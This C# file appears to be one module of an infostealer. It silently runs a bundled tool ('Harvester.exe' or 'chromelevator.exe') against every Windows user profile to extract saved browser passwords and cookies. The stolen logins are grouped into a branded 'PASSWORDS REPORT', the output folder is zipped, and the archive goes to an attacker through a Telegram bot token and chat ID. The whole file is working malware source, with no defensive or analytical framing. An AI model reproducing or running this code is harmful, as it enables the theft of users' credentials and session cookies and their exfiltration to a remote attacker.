using System;
using System.IO;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text;
using System.Linq;

namespace VanguardCore
{
    public class BrowserManager
    {
        private static string GetBaseDir()
        {
            try
            {
                string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string binFolder = Path.GetDirectoryName(dllPath); 
                DirectoryInfo parent = Directory.GetParent(binFolder);
                return parent != null ? parent.FullName : binFolder;
            }
            catch { return AppDomain.CurrentDomain.BaseDirectory; }
        }

        public static async Task<bool> Run(string botToken, string chatId, string baseDir)
        {
            try
            {
                if (string.IsNullOrEmpty(baseDir)) baseDir = GetBaseDir();
                
                // Flexible path resolution
                string[] searchPaths = {
                    Path.Combine(baseDir, "core", "Harvester.exe"),
                    Path.Combine(baseDir, "bin", "Harvester.exe"),
                    Path.Combine(baseDir, "Harvester.exe"),
                    Path.Combine(baseDir, "core", "chromelevator.exe"),
                    Path.Combine(baseDir, "bin", "chromelevator.exe")
                };

                string elevatorPath = "";
                foreach (var p in searchPaths)
                {
                    if (File.Exists(p)) { elevatorPath = p; break; }
                }

                if (string.IsNullOrEmpty(elevatorPath)) return false;

                string outputDir = Path.Combine(baseDir, "core", "output");
                if (!Directory.Exists(outputDir)) Directory.CreateDirectory(outputDir);

                // 1. All Users Extraction logic
                string usersRoot = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") ?? "C:", "Users");
                string[] userDirs = Directory.GetDirectories(usersRoot);
                
                bool atLeastOneSuccess = false;
                
                foreach (string userDir in userDirs)
                {
                    string userName = Path.GetFileName(userDir);
                    if (userName.Equals("Public", StringComparison.OrdinalIgnoreCase) || 
                        userName.Equals("Default", StringComparison.OrdinalIgnoreCase) ||
                        userName.Equals("Default User", StringComparison.OrdinalIgnoreCase) ||
                        userName.Equals("All Users", StringComparison.OrdinalIgnoreCase))
                        continue;

                    try { Directory.GetFiles(userDir); } catch { continue; }

                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = elevatorPath,
                        Arguments = "all --method nt -o \"" + outputDir + "\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    
                    Process p = Process.Start(psi);
                    if (p != null) p.WaitForExit(60000); 
                }

                // 2. Process Output
                string rawPasswords = Path.Combine(outputDir, "passwords.txt");
                string prettyPasswords = Path.Combine(outputDir, "pretty_passwords.txt");
                string cookiesFile = Path.Combine(outputDir, "cookies.txt");

                if (File.Exists(rawPasswords))
                {
                    GeneratePrettyFile(rawPasswords, prettyPasswords);
                }

                StringBuilder summary = new StringBuilder();
                summary.AppendLine("🚀 Native Browser Report");
                summary.AppendLine("----------------------------");

                if (File.Exists(prettyPasswords))
                {
                    summary.AppendLine("🔑 Passwords captured and formatted.");
                }

                if (File.Exists(cookiesFile))
                {
                    summary.AppendLine("📻 Cookies captured successfully.");
                }

                // 3. Create Archive
                string archivePath = Path.Combine(outputDir, string.Format("BrowserData_{0:yyyyMMdd_HHmmss}.zip", DateTime.Now));
                bool archived = CreateArchive(outputDir, archivePath);

                // 4. Send Report
                bool success = false;
                if (archived && File.Exists(archivePath))
                {
                    success = await NetworkingManager.SendFile(botToken, chatId, archivePath, summary.ToString());
                }
                else if (File.Exists(prettyPasswords)) // Fallback if zip fails
                {
                    success = await NetworkingManager.SendFile(botToken, chatId, prettyPasswords, summary.ToString());
                }

                return success;
            }
            catch { return false; }
        }

        private static bool CreateArchive(string sourceDir, string zipPath)
        {
            try
            {
                // We use dynamic loading to avoid hard dependency on System.IO.Compression.FileSystem if possible,
                // but for simplicity here we assume .NET 4.5+ ZipFile exists.
                if (File.Exists(zipPath)) File.Delete(zipPath);
                
                // If System.IO.Compression is not available, this will throw
                System.IO.Compression.ZipFile.CreateFromDirectory(sourceDir, zipPath);
                return true;
            }
            catch 
            {
                // Fallback or manual zip logic could go here
                return false; 
            }
        }

        private static void GeneratePrettyFile(string inputFile, string outputFile)
        {
            try
            {
                string asciiArt = @"
 █████╗ ███████╗███████╗██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗██╗████████╗ █████╗ ██╗   ██╗███████╗██╗  ██╗██╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═  ██╗██║ ██╔╝██║╚══██╔══╝██╔══██╗██╗  ██╔╝██╔════╝██║ ██╔╝██║
███████║█████╗  █████╗  ██████╔╝███████║██████╔╝██║   ██║█████╔╝ ██║   ██║   ███████║ ╚████╔╝ ███████╗█████╔╝ ██║
██╔══██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██║   ██║██╔═██╗ ██║   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔═██╗ ██║
██║  ██║██║     ███████╗██║  ██║██║  ██║██║     ╚██████╔╝██║  ██╗██║   ██║   ██║  ██║   ██║   ███████║██║  ██╗██║
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝";

                var lines = File.ReadAllLines(inputFile);
                var passwords = new List<PasswordEntry>();
                
                for (int i = 0; i < lines.Length; i += 4)
                {
                    if (i + 2 >= lines.Length) break;
                    
                    passwords.Add(new PasswordEntry {
                        Url = lines[i].Replace("domain ", "").Trim(),
                        User = lines[i+1].Replace("log ", "").Trim(),
                        Pass = lines[i+2].Replace("pass ", "").Trim()
                    });
                }

                var grouped = passwords.GroupBy(p => ExtractDomain(p.Url)).OrderBy(g => g.Key);
                
                using (StreamWriter sw = new StreamWriter(outputFile, false, Encoding.UTF8))
                {
                    sw.WriteLine(asciiArt);
                    sw.WriteLine("═══ 💎 PASSWORDS REPORT 💎 ═══");
                    sw.WriteLine();
                    
                    foreach (var group in grouped)
                    {
                        sw.WriteLine("🌐 DOMAIN: " + group.Key.ToUpper());
                        foreach (var p in group)
                        {
                            sw.WriteLine("  👤 Login: " + p.User);
                            sw.WriteLine("  🔑 Password: " + p.Pass);
                            sw.WriteLine("  🔗 Link: " + p.Url);
                            sw.WriteLine();
                        }
                        sw.WriteLine(new string('═', 30));
                    }
                }
            }
            catch { }
        }

        private static string ExtractDomain(string url)
        {
            if (string.IsNullOrEmpty(url)) return "UNKNOWN";
            try
            {
                if (!url.Contains("://")) url = "http://" + url;
                Uri uri = new Uri(url);
                string host = uri.Host;
                if (host.StartsWith("www.")) host = host.Substring(4);
                return host.ToUpper();
            }
            catch { return url.ToUpper(); }
        }

        private class PasswordEntry
        {
            public string Url { get; set; }
            public string User { get; set; }
            public string Pass { get; set; }
        }
    }
}
